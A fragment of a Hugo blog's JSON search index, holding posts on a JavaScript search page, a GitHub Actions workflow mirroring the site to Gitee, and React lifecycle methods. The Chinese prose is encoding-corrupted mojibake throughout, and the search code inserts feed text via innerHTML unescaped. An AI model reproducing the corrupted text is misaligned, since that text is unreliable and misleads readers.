\u0026#34;url\u0026#34;: \u0026#34;http://example.com/article2/\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;Article2\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;word2a word2b word2c\u0026#34; }, { \u0026#34;url\u0026#34;: \u0026#34;http://example.com/article1/\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;Article1\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;word1a word1b word1c\u0026#34; } ]} (3) éœ€è¦è€ƒè™‘çš„ç‚¹\nå¦‚ä½•æ ¹æ®ç°æœ‰æ–‡ç« ï¼Œæ‰§è¡ŒHUGOå‘½ä»¤ï¼Œè‡ªåŠ¨ç”Ÿæˆ search.json æ–‡ä»¶ æ‹¿åˆ°æœç´¢ç»“æœï¼Œä»¥ä»€ä¹ˆå½¢å¼å±•ç¤ºæœç´¢æ‹¿åˆ°çš„æ–‡ç« åˆ—è¡¨ï¼ˆæ–°çš„search page æˆ– ä¸‹æ‹‰é¢æ¿ï¼‰ golang æš´åŠ›è§£æ³•æ€è·¯:\nåˆ©ç”¨hugoç”Ÿæˆçš„index.xmlæ–‡ä»¶è¿›è¡Œå†…å®¹æœç´¢ hugoçš„contentç›®å½•ä¸‹çš„htmlæ–‡ä»¶ä¼šè¢«ç¼–è¯‘åˆ°æ¨¡æ¿ä¸­å» åˆ©ç”¨ä»¥ä¸Šç‰¹æ€§ä½¿ç”¨jså®ç°åŠŸèƒ½ html è½¬æ–‡æœ¬ æ—¶é—´æ ¼å¼è½¬æ¢ å®ç°ä»£ç \n+++ title = \u0026#34;æœç´¢\u0026#34; menu = \u0026#34;main\u0026#34; weight = 30 +++ \u0026lt;style\u0026gt; /* æ‰‹æœºé€‚é… */ @media screen and (max-width: 500px) { .search{ padding-right: 25px; } .search input{ width: 100%; } .search button{ display: none; } } /* ç”µè„‘é€‚é… */ @media screen and (min-width: 500px) { .search{ width: 500px; } .search input{ width: 444px; } } /* * @desc: æœç´¢é¡µå±è”½pageä¿¡æ¯ * 1ã€å¤´éƒ¨ ä½œè€…\u0026amp;åˆ†ç±»ä¿¡æ¯ * 2ã€åº•éƒ¨ä½œè€…ä¿¡æ¯ */ .post__meta, .authorbox { display: none; } /* é€šç”¨æ ·å¼ */ .search{ margin: auto; } .search input{ outline: none; border: 1.5px solid #62a1d5; height: 32px; padding: 10px; } .search button{ outline: none; border: 0px; height: 32px; width: 36px; position:absolute; background-color:#62a1d5; margin-left: 0.8rem; } .search .icon{ width: 26px; height: 26px; } .post__header .post__title { display: none; } .post-title a { color: #000; } .read-more { margin: 4px 0 8px; text-align: right; padding: 0 0.8rem 0; } .post { margin-bottom: 12px; } h3 { margin: 0.2rem 0 1rem; } .utterances { display: none; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026#34;search\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; placeholder=\u0026#34;è¯·è¾“å…¥æœç´¢å†…å®¹...\u0026#34; id=\u0026#34;search-key\u0026#34; /\u0026gt; \u0026lt;button onclick=\u0026#34;search()\u0026#34;\u0026gt; \u0026lt;svg t=\u0026#34;1583982313567\u0026#34; class=\u0026#34;icon\u0026#34; viewBox=\u0026#34;0 0 1024 1024\u0026#34; version=\u0026#34;1.1\u0026#34; xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; p-id=\u0026#34;1271\u0026#34; width=\u0026#34;200\u0026#34; height=\u0026#34;200\u0026#34; xmlns:xlink=\u0026#34;http://www.w3.org/1999/xlink\u0026#34;\u0026gt; \u0026lt;defs\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;\u0026lt;/style\u0026gt; \u0026lt;/defs\u0026gt; \u0026lt;path d=\u0026#34;M694.857143 475.428571q0-105.714286-75.142857-180.857142T438.857143 219.428571 258 294.571429 182.857143 475.428571t75.142857 180.857143T438.857143 731.428571t180.857143-75.142857T694.857143 475.428571z m292.571428 475.428572q0 29.714286-21.714285 51.428571t-51.428572 21.714286q-30.857143 0-51.428571-21.714286l-196-195.428571q-102.285714 70.857143-228 70.857143-81.714286 0-156.285714-31.714286t-128.571429-85.714286-85.714286-128.571428T36.571429 475.428571t31.714285-156.285714 85.714286-128.571428 128.571429-85.714286T438.857143 73.142857t156.285714 31.714286 128.571429 85.714286 85.714285 128.571428T841.142857 475.428571q0 125.714286-70.857143 228l196 196q21.142857 21.142857 21.142857 51.428572z\u0026#34; p-id=\u0026#34;1272\u0026#34; fill=\u0026#34;#ffffff\u0026#34;\u0026gt;\u0026lt;/path\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;h1 id=\u0026#34;search-tip\u0026#34; style=\u0026#34;color: #c05b4d;text-align: center;display: none;\u0026#34;\u0026gt;æœç´¢ä¸­ï¼Œè¯·ç¨å ...\u0026lt;/h1\u0026gt; \u0026lt;br /\u0026gt; \u0026lt;div id=\u0026#34;result\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; // enter window.onload = function() { document.onkeydown = function(ev) { var event = ev || event if (event.keyCode == 13) { search() } } } // search function search() { key = document.getElementById(\u0026#34;search-key\u0026#34;).value; if (key === \u0026#34;\u0026#34;) { return; } document.getElementById(\u0026#34;search-key\u0026#34;).value = \u0026#34;\u0026#34;; // tip document.getElementById(\u0026#34;search-tip\u0026#34;).innerText = \u0026#34;æœç´¢ä¸­ï¼Œè¯·ç¨å ...\u0026#34;; document.getElementById(\u0026#34;search-tip\u0026#34;).style.display = \u0026#34;block\u0026#34;; // clear var el = document.getElementById(\u0026#39;result\u0026#39;); var childs = el.childNodes; for (var i = childs.length - 1; i \u0026gt;= 0; i--) { el.removeChild(childs[i]); } // xml xmltext = new XMLHttpRequest; xmltext.open(\u0026#34;GET\u0026#34;, \u0026#34;/index.xml\u0026#34;, false); xmltext.send(); resp = xmltext.responseXML; items = resp.getElementsByTagName(\u0026#34;item\u0026#34;); // search var i = 0; haveResult = false; while (i \u0026lt; items.length) { txt = items[i].getElementsByTagName(\u0026#34;title\u0026#34;)[0].innerHTML + items[i].getElementsByTagName(\u0026#34;description\u0026#34;)[0].innerHTML if (txt.indexOf(key) \u0026gt; -1) { haveResult = true; title = items[i].getElementsByTagName(\u0026#34;title\u0026#34;)[0].innerHTML; link = items[i].getElementsByTagName(\u0026#34;link\u0026#34;)[0].innerHTML; time = items[i].getElementsByTagName(\u0026#34;pubDate\u0026#34;)[0].innerHTML; mark = items[i].getElementsByTagName(\u0026#34;description\u0026#34;)[0].innerHTML; time = formatDate(time) mark = xmlToTextString(mark); addItem(title, link, time, mark) } i++; } if (!haveResult) { document.getElementById(\u0026#34;search-tip\u0026#34;).innerText = \u0026#34;æœç´¢å®Œæ¯•ï¼Œæœªå‘ç°ç»“æœ ...\u0026#34;; document.getElementById(\u0026#34;search-tip\u0026#34;).style.display = \u0026#34;block\u0026#34;; } } // add function addItem(title, link, time, mark) { document.getElementById(\u0026#34;search-tip\u0026#34;).style.display = \u0026#34;none\u0026#34;; tmpl = \u0026#34;\u0026lt;article class=\\\u0026#34;post\\\u0026#34; style=\\\u0026#34;border-bottom: 1px solid #e6e6e6;\\\u0026#34; \u0026gt;\u0026#34; + \u0026#34;\u0026lt;header class=\\\u0026#34;post-header\\\u0026#34;\u0026gt;\u0026#34; + \u0026#34;\u0026lt;h3 class=\\\u0026#34;post-title\\\u0026#34;\u0026gt;\u0026lt;a class=\\\u0026#34;post-link\\\u0026#34; href=\\\u0026#34;\u0026#34; + link + \u0026#34;\\\u0026#34; target=\\\u0026#34;_blank\\\u0026#34;\u0026gt;\u0026#34; + title + \u0026#34;\u0026lt;/a\u0026gt;\u0026lt;/h3\u0026gt;\u0026#34; + \u0026#34;\u0026lt;div class=\\\u0026#34;post-meta\\\u0026#34;\u0026gt;\u0026#34; + \u0026#34; \u0026lt;span class=\\\u0026#34;post-time\\\u0026#34;\u0026gt;æ—¥æœŸï¼š\u0026#34; + time + \u0026#34;\u0026lt;/span\u0026gt;\u0026#34; + \u0026#34;\u0026lt;/div\u0026gt;\u0026#34; + \u0026#34; \u0026lt;/header\u0026gt;\u0026#34; + \u0026#34;\u0026lt;div class=\\\u0026#34;post-content\\\u0026#34;\u0026gt;\u0026#34; + \u0026#34;\u0026lt;div class=\\\u0026#34;post-summary\\\u0026#34;\u0026gt;æ‘˜è¦ï¼š\u0026#34; + mark + \u0026#34;\u0026lt;/div\u0026gt;\u0026#34; + \u0026#34;\u0026lt;div class=\\\u0026#34;read-more\\\u0026#34;\u0026gt;\u0026#34; + \u0026#34;\u0026lt;a href=\\\u0026#34;\u0026#34; + link + \u0026#34;\\\u0026#34; class=\\\u0026#34;read-more-link\\\u0026#34; target=\\\u0026#34;_blank\\\u0026#34;\u0026gt;é˜…è¯»æ›´å¤š\u0026lt;/a\u0026gt;\u0026#34; + \u0026#34;\u0026lt;/div\u0026gt;\u0026#34; + \u0026#34; \u0026lt;/div\u0026gt;\u0026#34; + \u0026#34;\u0026lt;/article\u0026gt;\u0026#34; div = document.createElement(\u0026#34;div\u0026#34;) div.innerHTML = tmpl; document.getElementById(\u0026#39;result\u0026#39;).appendChild(div) } // html è½¬åŒ– text() function xmlToTextString(xmlStr) { var htmlStr = xmlStr.replace( /\u0026amp;amp;/g, \u0026#34;\u0026amp;\u0026#34;).replace( /\u0026amp;quot;/g, \u0026#39;\u0026#34;\u0026#39;).replace( /\u0026amp;lt;/g, \u0026#34;\u0026lt;\u0026#34;).replace( /\u0026amp;gt;/g, \u0026#34;\u0026gt;\u0026#34;); var dd = htmlStr.replace(/\u0026lt;\\/?.+?\u0026gt;/g, \u0026#34;\u0026#34;); var dds= dd.replace(/ /g, \u0026#34;\u0026#34;); return dds } // 1. è‹¥å°äº10ï¼Œå‰é¢åŠ 0 function isZero(m){ return m\u0026lt;10?\u0026#39;0\u0026#39;+m:m } // å°†å­—ç¬¦ä¸²è½¬ä¸ºDateæ ¼å¼ï¼Œè·å–å¯¹åº”çš„å¹´ã€æœˆã€æ—¥ã€æ—¶ã€åˆ†ã€ç§’ã€‚ç»„åˆæ ¼å¼ function formatDate(DateStr) { //æ—¶é—´æˆ³æ˜¯æ•´æ•°ï¼Œå¦åˆ™è¦parseIntè½¬æ¢ var time = new Date(DateStr); // éœ€è¦ä½¿ç”¨Dateæ ¼å¼è¿›è¡Œæ—¥æœŸè½¬åŒ–ï¼Œè‹¥æ˜¯æ—¶é—´æˆ³ã€å­—ç¬¦ä¸²æ—¶é—´ï¼Œéœ€è¦é€šè¿‡new Date(..)è½¬åŒ– var y = time.getFullYear(); var m = time.getMonth()+1; var d = time.getDate(); return y+\u0026#39;å¹´\u0026#39;+isZero(m)+\u0026#39;æœˆ\u0026#39;+isZero(d)+\u0026#39;æ—¥\u0026#39;; } \u0026lt;/script\u0026gt; æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/tools-docs-hugo-grammar/","summary":"\u003cp\u003eå…³äºä½¿ç”¨hugoæ­å»ºåšå®¢è¿‡ç¨‹ä¸­ï¼Œé‡åˆ°çš„ä¸€äº›å°é—®é¢˜çš„è§£å†³æ–¹æ¡ˆ\u0026hellip;\u003c/p\u003e","title":"å·¥å…·: Hugoè¯­æ³•çºªè¦"},{"content":" ä¸€ã€å›é¡¾ã€å›½å¤–ç«™ç‚¹gitHubã€è‡ªåŠ¨æ„å»ºå‘å¸ƒ GitHub Action + Hugo è‡ªåŠ¨æ„å»ºå‘å¸ƒä¸ªäººåšå®¢è¯·å‚è€ƒè¿™é‡Œï¼šè‡ªåŠ¨åŒ–æ„å»ºåšå®¢\näºŒã€ã€å›½å†…ç«™ç‚¹giteeã€åŒæ­¥æ„å»ºå‘å¸ƒ å› ä¸ºä¸ä½¿ç”¨ä»˜è´¹çš„Gitee Pages ProæœåŠ¡ï¼Œé‚£ä¹ˆGiteeä¸èƒ½åƒGitHubä¸€æ ·è‡ªåŠ¨éƒ¨ç½²Pagesï¼Œè€Œæˆ‘ä»¬åˆæƒ³å®ç°Blogså›½å¤–å’Œå›½å†…ä¸¤ä¸ªç«™ç‚¹çš„åŒæ­¥æ„å»ºå‘å¸ƒã€‚é‚£ä¹ˆæ€è·¯å¦‚ä¸‹ï¼š\né¦–å…ˆä¿è¯ä½¿ç”¨GitHub Actionsï¼Œå¯ä»¥å®ç°å›½å¤–ç«™ç‚¹çš„è‡ªåŠ¨æ„å»ºå‘å¸ƒ åŒæ­¥GitHubä»£ç åˆ°Gitee: ä½¿ç”¨GitHub actions Yikun/hub-mirror-action@master Giteeæ„å»ºå‘å¸ƒï¼šyanglbme/gitee-pages-action@main 1. secretsé…ç½® åœ¨æ‰§è¡ŒgitHub Actionsè„šæœ¬çš„ä»“åº“é‡Œï¼š\né…ç½®secrets.GITEE_PRIVATE_KEY é…ç½®secrets.GITEE_TOKEN é…ç½®secrets.GITEE_PASSWORD æ³¨æ„ï¼š\né…ç½®secretsçš„ä»“åº“ï¼Œæ˜¯æ‰§è¡ŒActionsçš„ä»“åº“xxx/Blogs.gitï¼Œè€Œä¸æ˜¯å›½å¤–ç«™ç‚¹é™æ€æ–‡ä»¶å­˜å‚¨ä»“åº“xxx/xxx.github.io.git é…ç½®secretsçš„ä½ç½®æ˜¯åœ¨xxx/Blogs.gitä»“åº“çš„Settings -\u0026gt; Secrets -\u0026gt; Actionsä½ç½®ï¼Œç‚¹å‡» New repository secret secrets.GITEE_PRIVATE_KEYé…ç½®ä¸€å®šè¦æ˜¯ã€æœ¬åœ°çš„å¯†é’¥å¯¹ã€å…¨å±€ssh keyçš„å¯†é’¥ï¼Œæˆ‘è¿™é‡Œé…ç½®çš„æ˜¯id_rsa secrets.GITEE_PRIVATE_KEYå¯¹åº”çš„å…¬é’¥(id_rsa.pub)ï¼Œè¦é…ç½®åœ¨ã€éœ€è¦åŒæ­¥çš„è¿œç¨‹ä»“åº“ã€é‡Œï¼Œæˆ‘è¿™é‡Œæ˜¯Gitee sshç”Ÿæˆå‚è€ƒï¼šgitä¸­sshä¸https | Blogs\n2.ã€éåŒåä»“åº“ã€ä»£ç åŒæ­¥é—®é¢˜ï¼šYikun/hub-mirror-action@master ä½¿ç”¨Yikun/hub-mirror-action@masterå¯å®ç°ä»GitHubåˆ°Giteeçš„ä»£ç åŒæ­¥ ä½†å¯¹äºå›½å¤–ç«™ç‚¹lianpf.github.ioå’Œå›½å†…ç«™ç‚¹lianpfä»“åº“ä¸åŒåçš„é—®é¢˜ï¼Œéœ€è¦å¢åŠ é…ç½®ï¼šmappings: \u0026quot;lianpf.github.io=\u0026gt;lianpf\u0026quot; ä½¿ç”¨é…ç½®å¦‚ä¸‹ï¼š\nname: GiteePages ... jobs: deploy: runs-on: ubuntu-18.04 steps: - name: Sync to Gitee uses: Yikun/hub-mirror-action@master with: # æ›¿æ¢ä¸ºä½ çš„ GitHub ç”¨æˆ·å src: github/lianpf # æ›¿æ¢ä¸ºä½ çš„ Gitee ç”¨æˆ·å dst: gitee/lianpf dst_key: ${{ secrets.GITEE_PRIVATE_KEY }} dst_token: ${{ secrets.GITEE_TOKEN }} # ä»“åº“åä¸åŒæ—¶ï¼ŒåŒæ­¥ mappings: \u0026#34;lianpf.github.io=\u0026gt;lianpf\u0026#34; static_list: \u0026#34;lianpf.github.io\u0026#34; force_update: true debug: true ... 3. å›½å†…ç«™ç‚¹Gitee Pageå‘å¸ƒé—®é¢˜ï¼šyanglbme/gitee-pages-action@main name: GiteePages ... jobs: deploy: runs-on: ubuntu-18.04 steps: ... - name: Build Gitee Pages uses: yanglbme/gitee-pages-action@main with: # æ³¨æ„æ›¿æ¢ä¸ºä½ çš„ Gitee ç”¨æˆ·å gitee-username: lianpf # æ³¨æ„æ›¿æ¢ä¸ºä½ çš„ Gitee ç”¨æˆ·å gitee-password: ${{ secrets.GITEE_PASSWORD }} # æ³¨æ„æ›¿æ¢ä¸ºä½ çš„ Gitee ä»“åº“ï¼Œä»“åº“åä¸¥æ ¼åŒºåˆ†å¤§å°å†™ï¼Œè¯·å‡†ç¡®å¡«å†™ï¼Œå¦åˆ™ä¼šå‡ºé”™ gitee-repo: lianpf/lianpf # è¦éƒ¨ç½²çš„åˆ†æ”¯ï¼Œé»˜è®¤æ˜¯ masterï¼Œè‹¥æ˜¯å…¶ä»–åˆ†æ”¯ï¼Œåˆ™éœ€è¦æŒ‡å®šï¼ˆæŒ‡å®šçš„åˆ†æ”¯å¿…é¡»å­˜åœ¨ï¼‰ branch: master ä¸‰ã€åŒç«™ç‚¹ã€è‡ªåŠ¨åŒ–åŒæ­¥æ„å»ºå‘å¸ƒã€å®Œæ•´é…ç½® name: GitHubPages on: push: branches: - master # è®¾ç½®éƒ¨ç½²åˆ†æ”¯ paths-ignore: # å¿½ç•¥æ–‡ä»¶ - \u0026#39;README.md\u0026#39; - \u0026#39;.env\u0026#39; - \u0026#39;.gitignore\u0026#39; - \u0026#39;bin\u0026#39; jobs: deploy: runs-on: ubuntu-18.04 steps: - uses: actions/checkout@v2 with: submodules: recursive # Fetch Hugo themes (true OR recursive) fetch-depth: 0 # Fetch all history for .GitInfo and .Lastmod # - name: Read .env # id: hugo-version # run: | # . ./.env # echo \u0026#34;::set-output name=HUGO_VERSION::${HUGO_VERSION}\u0026#34; - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: # hugo-version: \u0026#39;${{ steps.hugo-version.outputs.HUGO_VERSION }}\u0026#39; hugo-version: \u0026#39;0.75.1\u0026#39; # 0.75.1 latest extended: true - name: Build run: | hugo --minify echo -e \u0026#34;Generated by Hugo.\\nLatest build: $(date).\\n\u0026#34; \u0026gt; public/README - name: Deploy GitHub uses: peaceiris/actions-gh-pages@v3 with: deploy_key: ${{ secrets.ACTIONS_DEPLOY_KEY }} external_repository: lianpf/lianpf.github.io publish_branch: master publish_dir: ./public - name: Sync to Gitee uses: Yikun/hub-mirror-action@master with: # æ›¿æ¢ä¸ºä½ çš„ GitHub ç”¨æˆ·å src: github/lianpf # æ›¿æ¢ä¸ºä½ çš„ Gitee ç”¨æˆ·å dst: gitee/lianpf dst_key: ${{ secrets.GITEE_PRIVATE_KEY }} dst_token: ${{ secrets.GITEE_TOKEN }} # ä»“åº“åä¸åŒæ—¶ï¼ŒåŒæ­¥ mappings: \u0026#34;lianpf.github.io=\u0026gt;lianpf\u0026#34; static_list: \u0026#34;lianpf.github.io\u0026#34; force_update: true debug: true - name: Build And Deploy Gitee Pages uses: yanglbme/gitee-pages-action@main with: # æ³¨æ„æ›¿æ¢ä¸ºä½ çš„ Gitee ç”¨æˆ·å gitee-username: lianpf # æ³¨æ„æ›¿æ¢ä¸ºä½ çš„ Gitee ç”¨æˆ·å gitee-password: ${{ secrets.GITEE_PASSWORD }} # æ³¨æ„æ›¿æ¢ä¸ºä½ çš„ Gitee ä»“åº“ï¼Œä»“åº“åä¸¥æ ¼åŒºåˆ†å¤§å°å†™ï¼Œè¯·å‡†ç¡®å¡«å†™ï¼Œå¦åˆ™ä¼šå‡ºé”™ gitee-repo: lianpf/lianpf # è¦éƒ¨ç½²çš„åˆ†æ”¯ï¼Œé»˜è®¤æ˜¯ masterï¼Œè‹¥æ˜¯å…¶ä»–åˆ†æ”¯ï¼Œåˆ™éœ€è¦æŒ‡å®šï¼ˆæŒ‡å®šçš„åˆ†æ”¯å¿…é¡»å­˜åœ¨ï¼‰ branch: master å‚è€ƒ wearerequired/git-mirror-action@master yanglbme/gitee-pages-action Gitee å¦‚ä½•è‡ªåŠ¨éƒ¨ç½² Pages | å†´ç¾½ æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/gitee-sync-build-blog/","summary":"ä¸€ã€å›é¡¾ã€å›½å¤–ç«™ç‚¹gitHubã€è‡ªåŠ¨æ„å»ºå‘å¸ƒ GitHub Action + Hugo è‡ªåŠ¨æ„å»º","title":"GitHub Action + Gitee æ„å»ºåŒæ­¥å›½å†…å’Œå›½å¤–ç«™ç‚¹"},{"content":"æ±‡æ€»ä¸€ä¸‹SSRåŒæ„æ–¹æ¡ˆï¼Œè¿™é‡Œä»¥REACTä¸ºä¾‹\u0026hellip;\nä¸€ã€ä»€ä¹ˆæ˜¯SSR 1.æ ‡é¢˜1.1 æ­£æ–‡ã€‚ã€‚ã€‚\näºŒã€SSRæ ¸å¿ƒåŸç† ä¸‰ã€åŒç«¯æœºåˆ¶å¯¹æ¯” å‚è€ƒ https://juejin.cn/post/6844904127537889287 æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/frontend-develop/react-ssr/","summary":"\u003cp\u003eæ±‡æ€»ä¸€ä¸‹SSRåŒæ„æ–¹æ¡ˆï¼Œè¿™é‡Œä»¥REACTä¸ºä¾‹\u0026hellip;\u003c/p\u003e","title":"React \u0026 Vue: SSRåŒæ„"},{"content":"è¿™æ˜¯ä¸€ç¯‡åŸè®¡åˆ’åœ¨react v16.x å‘å¸ƒçš„æ—¶å€™è¦å†™çš„æ–‡ç« ï¼ŒæŒ‰ç…§è¿™ä¸ªæ—¶é—´èŠ‚ç‚¹ï¼Œè‡³å°‘æ‹–æ¬ äº†ä¸¤å¹´ä¹‹ä¹…\u0026hellip;\nå¤§éƒ¨åˆ†å›¢é˜Ÿä¸è§å¾—ä¼šè·Ÿè¿›å‡åˆ°16ç‰ˆæœ¬ï¼Œæ‰€ä»¥16å‰çš„ç”Ÿå‘½å‘¨æœŸè¿˜æ˜¯å¾ˆæœ‰å¿…è¦æŒæ¡çš„ï¼Œä½•å†µ16ä¹Ÿæ˜¯åŸºäºä¹‹å‰çš„ä¿®æ”¹ã€‚æ‰€ä»¥æˆ‘ä»¬ä¼šé’ˆå¯¹ v16.0 ä¹‹å‰ å’Œ v16.xçš„ç»´åº¦å»ä»‹ç»\nç»„ä»¶ç”Ÿå‘½å‘¨æœŸçš„ä¸‰ä¸ªé˜¶æ®µ Mountingï¼ˆåŠ è½½é˜¶æ®µï¼‰ Some methods are called in the following order when an instance of a component is being created and inserted into the DOM.\nUpdatingï¼ˆæ›´æ–°é˜¶æ®µï¼‰ An update can be caused by changes to props or state. Some methods are called in the following order when a component is being re-rendered.\nUnmountingï¼ˆå¸è½½é˜¶æ®µï¼‰ When a component is being removed from the DOM.\næ—§çš„ç”Ÿå‘½å‘¨æœŸ(v16.0ä¹‹å‰) Mountingï¼ˆåŠ è½½é˜¶æ®µï¼šæ¶‰åŠ6ä¸ªé’©å­å‡½æ•°ï¼‰ constructor() åŠ è½½çš„æ—¶å€™è°ƒç”¨ä¸€æ¬¡ï¼Œå¯ä»¥åˆå§‹åŒ–state getDefaultProps() è®¾ç½®é»˜è®¤çš„propsï¼Œä¹Ÿå¯ä»¥ç”¨dufaultPropsè®¾ç½®ç»„ä»¶çš„é»˜è®¤å±æ€§ getInitialState() åˆå§‹åŒ–stateï¼Œå¯ä»¥ç›´æ¥åœ¨constructorä¸­å®šä¹‰this.state componentWillMount() ç»„ä»¶åŠ è½½æ—¶åªè°ƒç”¨ï¼Œä»¥åç»„ä»¶æ›´æ–°ä¸è°ƒç”¨ï¼Œæ•´ä¸ªç”Ÿå‘½å‘¨æœŸåªè°ƒç”¨ä¸€æ¬¡ï¼Œæ­¤æ—¶å¯ä»¥ä¿®æ”¹state render() reactæœ€é‡è¦çš„æ­¥éª¤ï¼Œåˆ›å»ºè™šæ‹Ÿdomï¼Œè¿›è¡Œdiffç®—æ³•ï¼Œæ›´æ–°domæ ‘éƒ½åœ¨æ­¤è¿›è¡Œ componentDidMount() ç»„ä»¶æ¸²æŸ“ä¹‹åè°ƒç”¨ï¼Œåªè°ƒç”¨ä¸€æ¬¡ Updatingï¼ˆæ›´æ–°é˜¶æ®µï¼šæ¶‰åŠ5ä¸ªé’©å­å‡½æ•°) componentWillReceiveProps(nextProps) ç»„ä»¶åŠ è½½æ—¶ä¸è°ƒç”¨ï¼Œç»„ä»¶æ¥å—æ–°çš„propsæ—¶è°ƒç”¨ shouldComponentUpdate(nextProps, nextState) ç»„ä»¶æ¥æ”¶åˆ°æ–°çš„propsæˆ–è€…stateæ—¶è°ƒç”¨ï¼Œreturn trueå°±ä¼šæ›´æ–°domï¼ˆä½¿ç”¨diffç®—æ³•æ›´æ–°ï¼‰ï¼Œreturn falseèƒ½é˜»æ­¢æ›´æ–°ï¼ˆä¸è°ƒç”¨renderï¼‰ componentWillUpdata(nextProps, nextState) ç»„ä»¶åŠ è½½æ—¶ä¸è°ƒç”¨ï¼Œåªæœ‰åœ¨ç»„ä»¶å°†è¦æ›´æ–°æ—¶æ‰è°ƒç”¨ï¼Œæ­¤æ—¶å¯ä»¥ä¿®æ”¹state render() reactæœ€é‡è¦çš„æ­¥éª¤ï¼Œåˆ›å»ºè™šæ‹Ÿdomï¼Œè¿›è¡Œdiffç®—æ³•ï¼Œæ›´æ–°domæ ‘éƒ½åœ¨æ­¤è¿›è¡Œ componentDidUpdate() ç»„ä»¶åŠ è½½æ—¶ä¸è°ƒç”¨ï¼Œç»„ä»¶æ›´æ–°å®Œæˆåè°ƒç”¨ Unmountingï¼ˆå¸è½½é˜¶æ®µï¼šæ¶‰åŠ1ä¸ªé’©å­å‡½æ•°ï¼‰ componentWillUnmount()\nç»„ä»¶å³å°†å¸è½½å‰è°ƒç”¨ï¼Œåªè°ƒç”¨ä¸€æ¬¡\nåŸºç¡€å†™æ³• import React, { Component } from \u0026#39;react\u0026#39; export default class ReactComponent15 extends Component { constructor(props) { super(props) // getDefaultPropsï¼šæ¥æ”¶åˆå§‹props // getInitialStateï¼šåˆå§‹åŒ–state } state = { } componentWillMount() { // ç»„ä»¶æŒ‚è½½å‰è§¦å‘ } render() { return ( \u0026lt;h2\u0026gt;Old React.Component\u0026lt;/h2\u0026gt; ) } componentDidMount() { // ç»„ä»¶æŒ‚è½½åè§¦å‘ } componentWillReceiveProps(nextProps) { // æ¥æ”¶åˆ°æ–°çš„propsæ—¶è§¦å‘ } shouldComponentUpdate(nextProps, nextState) { // ç»„ä»¶Propsæˆ–è€…stateæ”¹å˜æ—¶è§¦å‘ï¼Œtrueï¼šæ›´æ–°ï¼Œfalseï¼šä¸æ›´æ–° return true } componentWillUpdate(nextProps, nextState) { // ç»„ä»¶æ›´æ–°å‰è§¦å‘ } componentDidUpdate() { // ç»„ä»¶æ›´æ–°åè§¦å‘ } componentWillUnmount() { // ç»„ä»¶å¸è½½æ—¶è§¦å‘ } } æ–°çš„ç”Ÿå‘½å‘¨æœŸ(v16.x) static getDerivedStateFromProps(props, state) getSnapshotBeforeUpdate(prevProps, prevState) static getDerivedStateFromProps(props, state) 